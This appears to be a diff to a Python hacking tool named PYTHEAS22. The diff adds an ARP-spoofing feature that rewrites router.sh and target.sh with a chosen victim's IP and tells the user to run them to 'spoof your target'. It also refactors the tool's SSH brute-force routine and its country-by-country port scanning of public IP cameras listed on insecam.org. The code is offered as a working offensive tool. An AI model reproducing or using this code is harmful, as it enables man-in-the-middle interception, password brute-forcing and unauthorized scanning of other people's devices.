@@ -63,9 +63,9 @@ class PortScanner:
     every_ip_with_name = []
     my_ip_address = None
     check_open_port = []
-    open_ports = []
     hostnames = {}
     hostname = None
+    open_ports = []
 
     def __init__(self):
         self.headers = None
@@ -222,8 +222,8 @@ class PortScanner:
         else:
             bp.color(
                 "To specify the range you simply write 'number1-number2'. "
-                "Number 1 should be smaller than number 2\n If you only want"
-                "to scan one port. Just type one number",
+                "Number 1 should be smaller than number 2\nIf you only want " 
+                "to scan one port. Just type one number".upper(),
                 PortScanner.random_color)
             str_range = bp.color("What is your range: ", PortScanner.random_color, False)
             while True:
@@ -236,7 +236,8 @@ class PortScanner:
                             print("SECOND NUMBER IS GREATER THAN THE FIRST NUMBER. (min-max)")
                             continue
 
-                        real_range = PortScanner.get_lst(PortScanner, port_range=str_port_range)
+                        get_range = PortScanner()
+                        real_range = get_range.get_lst(port_range=str_port_range)
                         lst_everything.extend(real_range)
                         return lst_everything
 
@@ -346,61 +347,158 @@ class PortScanner:
                     if mac_ip != "ff-ff-ff-ff-ff-ff":
                         indexes.append((arp_ip, mac_ip))
 
-
         get_mac = PortScanner()
         ip_name = [(ip, get_mac.get_name(ip, mac)) for ip, mac in indexes]
         return ip_name
 
+    @staticmethod
+    def get_router_ip():
+        potential_router_ip = [PortScanner.every_ip_with_name[0][0], PortScanner.every_ip_with_name[-1][0]]
+        for router in potential_router_ip:
+            if router.split(".")[-1] in ["1", "254"]:
+                return router
 
     @staticmethod
-    def internal_network():
-        global this_ip
-        bp.color("ALL THE DEVICES IN YOUR NETWORK WILL BE SHOWN SOON", PortScanner.random_color)
-        if sys.platform == "linux":
-            threading_wait = threading.Thread(target=PortScanner.wait)
-            threading_wait.start()
-            host_ip = PortScanner.get_ip()
-            PortScanner.my_ip_address = host_ip[1][0][0]
-            all_data = subprocess.run(["nmap", "-sn", f"{host_ip[0]}/{host_ip[1][0][1]}"], capture_output=True)
-            PortScanner.waiting = True
-            time.sleep(0.6)
-            PortScanner.waiting = False
-            get_everything = str(all_data).split()
-            all_ips = [(get_everything[idx + 1].replace("\\nHost", ""), get_everything[idx + 2].replace("\\nHost", ""),
-                        get_everything[idx + 8].replace("\\nNmap", "").replace("(", "").replace(")", "")) for idx, ip in
-                       enumerate(get_everything) if ip == "for"]
-            internal_networks = [ips[0] for ips in all_ips if not re.search("[a-zA-Z]", ips[0])]
-            others = [name for name in all_ips if re.search("[a-zA-Z]", name[0])]
+    def change_file(filename, pos1, pos2, device):
+        os.chdir("ARPSPOOF_SCRIPT")
+        with open(filename, "r+") as file:
+            data = file.read()
+            data = data.split()
+            data[5] = device
+            data[7] = pos1
+            data[8] = pos2 + ")"
+            data[0] = data[0] + "\n"
 
-            for every_ip in all_ips:
-                for this_ip in internal_networks:
-                    if this_ip == every_ip[0]:
-                        if not re.search("[a-zA-Z]", every_ip[2]):  
-                            PortScanner.every_ip_with_name.append((this_ip, "Unknown"))
-                        else:
-                            PortScanner.every_ip_with_name.append((this_ip, every_ip[2]))
+            for idx, space in enumerate(data[1:]):
+                if idx != 0:
+                    data[idx] += " "
 
-            if others:
-                for not_in_lst in others:
-                    PortScanner.every_ip_with_name.append(
-                        (not_in_lst[1].replace("(", "").replace(")", ""), not_in_lst[0]))
-            
-            get_only_ips = [ip for ip, host in PortScanner.every_ip_with_name]
-            numbers = sorted([int(each_ip.split(".")[-1]) for each_ip in get_only_ips])
-            sorted_ips = [(ip, host) for num in numbers for ip, host in PortScanner.every_ip_with_name if int(ip.split(".")[-1]) == num]
-            PortScanner.every_ip_with_name = sorted_ips
+        with open(filename, "w+") as file:
+            for each in data:
+                file.write(each)
+        os.chdir("..")
 
-        elif sys.platform == "win32" or sys.platform == "windows" or sys.platform == "win64":
-            win_threading_wait = threading.Thread(target=PortScanner.wait)
-            win_threading_wait.start()
-            windows = PortScanner()
-            PortScanner.every_ip_with_name = windows.internal_windows()
-            time.sleep(0.5)
-            PortScanner.waiting = True
-            time.sleep(0.5)
-            PortScanner.waiting = False
+    @staticmethod
+    def spoof_ip(router, target):
+        get_device = subprocess.run(["nmcli", "connection", "show"], capture_output=True).stdout.decode()
 
-        print()
+        get_device = get_device.split()[4:]
+
+        all_conncections = ["ethernet", "wifi", "loopback"]
+        devices = []
+        for idx, each in enumerate(get_device):
+            if each in all_conncections:
+                device = get_device[idx + 1]
+                if device != "lo":
+                    devices.append(device)
+
+        if devices:
+            all_devices = " ".join(devices)
+            bp.color(f"\nALL DEVICES: {all_devices}\n", PortScanner.random_color)
+            chosen_device = input(bp.color("WHICH DEVICE DO YOU WANT TO RUN YOUR SPOOF ON?: ", PortScanner.random_color, False))
+            if chosen_device in devices:
+                PortScanner.change_file("router.sh", router, target, chosen_device)
+                PortScanner.change_file("target.sh", target, router, chosen_device)
+                bp.color("\n\nOPEN TWO TERMINALS\n"
+                         "GO TO THE DIRECTORY 'ARPSPOOF_SCRIPT'\n"
+                         "RUN 'bash router.sh' ON THE FIRST TERMINAL AND \n"
+                         "RUN 'bash target.sh' ON THE SECOND TERMINAL\n"
+                         "TO SPOOF YOUR TARGET\n\nTHANK YOU FOR USING PYTHEAS22", PortScanner.random_color)
+                sys.exit()
+
+            else:
+                print(f"{chosen_device} IS NOT IN LIST")
+                sys.exit()
+
+
+        else:
+            print("YOU ARE NOT CONNECTED WITH THE INTERNET")
+            print("THANK YOU FOR USING PYTHEAS22")
+            sys.exit()
+
+
+    def __arp_spoof(self):
+        self.ip = None
+        if sys.platform != "linux":
+            print("SORRY THIS ONLY WORKS ON LINUX. YOU CAN USE A VIRTUAL MACHINE TO RUN THIS")
+            sys.exit()
+        else:
+            self.linux_lst()
+            self.print_internal()
+
+            all_ips = [ip[0] for ip in PortScanner.every_ip_with_name]
+            router = self.get_router_ip()
+            while True:
+                try:
+                    str_this_ip = bp.color("Which ip do you want to arp spoof (just write the number of your ip)?: ",
+                                           PortScanner.random_color, False)
+                    self.ip = int(input(str_this_ip))
+                    if self.ip <= 0:
+                        print("PLEASE WRITE A NUMBER THAT IS ABOVE YOU")
+                        continue
+                    else:
+                        self.ip = all_ips[self.ip - 1]
+                    break
+                except ValueError:
+                    print("PLEASE WRITE NUMBERS NOT STRINGS")
+                    continue
+
+                except IndexError:
+                    print("PLEASE WRITE A NUMBER THAT IS ABOVE YOU")
+                    continue
+
+            if router:
+                if self.ip != router:
+                    spoof = PortScanner()
+                    spoof.spoof_ip(router, self.ip)
+                else:
+                    print("YOU CANNOT SPOOF YOUR ROOTER")
+                    sys.exit()
+            else:
+                print("THE ROUTER COULD NOT BE FOUND. PLEASE TYPE IT MANUALLY")
+                router_question = bp.color("\nRouter's IP: ", PortScanner.random_color, False)
+                get_router = input(router_question)
+                spoof = PortScanner()
+                spoof.spoof_ip(get_router, self.ip)
+
+    @staticmethod
+    def linux_lst():
+        threading_wait = threading.Thread(target=PortScanner.wait)
+        threading_wait.start()
+        host_ip = PortScanner.get_ip()
+        PortScanner.my_ip_address = host_ip[1][0][0]
+        all_data = subprocess.run(["nmap", "-sn", f"{host_ip[0]}/{host_ip[1][0][1]}"], capture_output=True)
+        PortScanner.waiting = True
+        time.sleep(0.6)
+        PortScanner.waiting = False
+        get_everything = str(all_data).split()
+        all_ips = [(get_everything[idx + 1].replace("\\nHost", ""), get_everything[idx + 2].replace("\\nHost", ""),
+                    get_everything[idx + 8].replace("\\nNmap", "").replace("(", "").replace(")", "")) for idx, ip in
+                   enumerate(get_everything) if ip == "for"]
+        internal_networks = [ips[0] for ips in all_ips if not re.search("[a-zA-Z]", ips[0])]
+        others = [name for name in all_ips if re.search("[a-zA-Z]", name[0])]
+
+        for every_ip in all_ips:
+            for this_ip in internal_networks:
+                if this_ip == every_ip[0]:
+                    if not re.search("[a-zA-Z]", every_ip[2]):
+                        PortScanner.every_ip_with_name.append((this_ip, "Unknown"))
+                    else:
+                        PortScanner.every_ip_with_name.append((this_ip, every_ip[2]))
+
+        if others:
+            for not_in_lst in others:
+                PortScanner.every_ip_with_name.append(
+                    (not_in_lst[1].replace("(", "").replace(")", ""), not_in_lst[0]))
+
+        get_only_ips = [ip for ip, host in PortScanner.every_ip_with_name]
+        numbers = sorted([int(each_ip.split(".")[-1]) for each_ip in get_only_ips])
+        sorted_ips = [(ip, host) for num in numbers for ip, host in PortScanner.every_ip_with_name if
+                      int(ip.split(".")[-1]) == num]
+        PortScanner.every_ip_with_name = sorted_ips
+
+    @staticmethod
+    def print_internal():
         all_intern_ip = []
         just_ips = []
         for number, every_ip in enumerate(PortScanner.every_ip_with_name):
@@ -415,8 +513,7 @@ class PortScanner:
                 pass
             if every_ip[0] == PortScanner.my_ip_address:
                 ip_name = "MY IP-ADDRESS"
-            
-            
+
             ip_len = f"[{number + 1}]:"
             length = 6 - len(ip_len)
             spaces_len = f"".join([" " for _ in range(length)])
@@ -428,6 +525,28 @@ class PortScanner:
 
             bp.color(f"{printing}{ip_name}", PortScanner.random_color)
             just_ips.append(every_ip[0])
+        return all_intern_ip, just_ips
+
+    @staticmethod
+    def internal_network():
+        global this_ip
+        bp.color("ALL THE DEVICES IN YOUR NETWORK WILL BE SHOWN SOON", PortScanner.random_color)
+        if sys.platform == "linux":
+            get_lst = PortScanner()
+            get_lst.linux_lst()
+
+        elif sys.platform == "win32" or sys.platform == "windows" or sys.platform == "win64":
+            win_threading_wait = threading.Thread(target=PortScanner.wait)
+            win_threading_wait.start()
+            windows = PortScanner()
+            PortScanner.every_ip_with_name = windows.internal_windows()
+            time.sleep(0.5)
+            PortScanner.waiting = True
+            time.sleep(0.5)
+            PortScanner.waiting = False
+
+        print()
+        all_intern_ip, just_ips = PortScanner.print_internal()
 
         while True:
             scan_intern = bp.color("\nDo you want to scan all ip's? [y/n]: ".upper(), PortScanner.random_color, False)
@@ -441,12 +560,14 @@ class PortScanner:
                     counter = bp.color(f"\nScanning {idx + 1} of {len(all_intern_ip)}\n".upper(),
                                        PortScanner.random_color, False)
                     print(counter, end="")
-                    PortScanner.start_scanning(PortScanner, PortScanner.well_known_ports, every_port, print_text=False,
+                    scan = PortScanner()
+                    scan.start_scanning(PortScanner.well_known_ports, every_port, print_text=False,
                                                ssh=True, scan_internal_ip=True)
                     time.sleep(0.5)
 
                 if PortScanner.ssh_port:
-                    PortScanner.hack_ip_ssh(PortScanner, PortScanner.ssh_port)
+                    hacking = PortScanner()
+                    hacking.hack_ip_ssh(PortScanner.ssh_port)
 
                 if "Internal_Network.db" in os.listdir():
                     bp.color("All open ports in your network has been saved to 'Internal_Network.db'",
@@ -525,26 +646,23 @@ class PortScanner:
 
                 for host in ssh_lst:
                     for index, row in enumerate(all_passwords):
-                        t = threading.Thread(target=self.__ssh_connect, args=(PortScanner, host, row[0], row[1],))
+                        t = threading.Thread(target=self.__ssh_connect, args=(host, row[0], row[1],))
                         t.start()
                         time.sleep(0.2)
 
                 break
 
-    def tcp_connect(self, this_ip, port, print_text):
+    def tcp_connect(self, ip, port, print_text):
         bp.color(f"SCANNING PORT: {port}", PortScanner.random_color)
         try:
             start = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             start.settimeout(1)
             try:
-                start.connect((this_ip, port))
+                start.connect((ip, port))
                 self.open_ports.append(port)
                 self.check_open_port.append(port)
                 time.sleep(0.5)
-                if port == 22: self.ssh_port.append(this_ip)
-              
-            except TimeoutError:
-                pass
+                if port == 22: self.ssh_port.append(ip)
 
             except socket.gaierror:
                 if not PortScanner.is_web:
@@ -552,7 +670,7 @@ class PortScanner:
                         bp.color("THIS IP IS NOT AVAILABLE", PortScanner.random_color)
                 else:
                     if print_text:
-                        bp.color(f"WEBSITE: {this_ip} IS NOT AVAILABLE", PortScanner.random_color)
+                        bp.color(f"WEBSITE: {ip} IS NOT AVAILABLE", PortScanner.random_color)
                 quit()
 
             except KeyboardInterrupt:
@@ -629,17 +747,17 @@ class PortScanner:
 
             if country is not None:
                 PortScanner.add_to_db(self.country_name, this_ip, "".join(str(self.open_ports)), name=country)
-                self.open_ports = []
+                PortScanner.open_ports = []
 
             if self.ssh_port and country is None and ssh is True and scan_internal_ip is False:
-                PortScanner.hack_ip_ssh(PortScanner, self.ssh_port)
+                self.hack_ip_ssh(self.ssh_port)
 
             if ssh is False:
-                print("SET ssh_bruteforce to True")
+                print("SET ssh_bruteforce TO TRUE IF YOU WANT TO BRUTEFORCE THAT IP-ADDRESS")
 
             if scan_internal_ip:
                 PortScanner.add_to_db_intern(this_ip, "".join(str(self.open_ports)))
-                self.open_ports = []
+                PortScanner.open_ports = []
 
         else:
             if print_text:
@@ -652,7 +770,7 @@ class PortScanner:
         if print_text and not self.ssh_port:
             bp.color("\nTHANK YOU FOR USING PYTHEAS22", PortScanner.random_color)
 
-    def ip_cameras(self, port_lst=None, ssh=False):
+    def ip_cameras(self, port_lst=None):
         colorama.init()
 
         url = "http://www.insecam.org/en/jsoncountries/"
@@ -674,7 +792,7 @@ class PortScanner:
 
         self.country_name = {}
         bp.color("ALL COUNTRIES WITH IP-CAMERAS WILL BE SHOWN SOON", PortScanner.random_color)
-        PortScanner.cool_text(PortScanner)
+        self.cool_text()
 
         for key, value in countries.items():
             bp.color(f'Code : ({key}) - {value["country"]} / ({value["count"]})  ',
@@ -690,7 +808,7 @@ class PortScanner:
             if answer.upper() in self.country_name:
                 hacked_country = self.country_name[answer.upper()]
                 if port_lst is None:
-                    all_lst = PortScanner.ask_range(PortScanner)
+                    all_lst = self.ask_range()
                 else:
                     all_lst = port_lst
 
@@ -705,19 +823,19 @@ class PortScanner:
                 bp.color(
                     f"EVERY OPEN PORT OF THE IP-CAMERAS IN {hacked_country} WILL BE SAVED IN AN DATABASE CALLED {hacked_country}_Ports.db",
                     PortScanner.random_color)
-                PortScanner.cool_text(PortScanner)
+                self.cool_text()
 
                 bp.color("\nSTARTING\n", PortScanner.random_color)
                 for idx, every_port in enumerate(get_all_ports):
                     counter = bp.color(f"\nScanning {idx + 1} of {len(get_all_ports)}\n".upper(),
                                        PortScanner.random_color, False)
                     print(counter, end="")
-                    PortScanner.start_scanning(PortScanner, all_lst, every_port, print_text=False,
+                    self.start_scanning(all_lst, every_port, print_text=False,
                                                country=answer.upper(), ssh=True)
                 os.chdir("..")
 
                 if self.ssh_port:
-                    PortScanner.hack_ip_ssh(PortScanner, self.ssh_port)
+                    self.hack_ip_ssh(self.ssh_port)
                 if self.check_open_port:
                     print(f"ALL OPEN PORTS HAVE BEEN SAVED IN THE DATABASE '{hacked_country}_Ports.db'")
                 print(f"ALL LINKS HAVE BEEN SAVED IN {hacked_country}.\nTHANK YOU FOR USING PYTHEAS22")
@@ -755,13 +873,18 @@ class PortScanner:
                     quest = input(multiple)
 
                     if quest.lower() == "n":
-                        str_an_ip = bp.color("Which ip or website do you want to Scan: ", PortScanner.random_color,
-                                             False)
-                        this_ip = input(str_an_ip)
-                        check_website += 1
-                        break
+                        ask_arp = bp.color("Do you want to Arp Spoof someone on your network [y/n]: ".upper(), PortScanner.random_color, False)
+                        asking_arp = input(ask_arp)
+                        if asking_arp.lower() == "y":
+                            self.__arp_spoof()
+                        else:
+                            str_an_ip = bp.color("Which ip or website do you want to Scan: ", PortScanner.random_color,
+                                                 False)
+                            this_ip = input(str_an_ip)
+                            check_website += 1
+                            break
                     elif quest.lower() == "y":
-                        PortScanner.ip_cameras(PortScanner)
+                        self.ip_cameras()
 
             elif internal_ips.lower() != "y" or internal_ips.lower() != "n":
                 print("y or n please !!!".upper())
@@ -769,7 +892,7 @@ class PortScanner:
             if check_website >= 1:
                 break
 
-        lst_port = PortScanner.ask_range(PortScanner)
+        lst_port = self.ask_range()
         lst_everything.extend(lst_port)
 
-        PortScanner.start_scanning(PortScanner, lst_everything, this_ip, ssh=True)
+        self.start_scanning(lst_everything, this_ip, ssh=True)
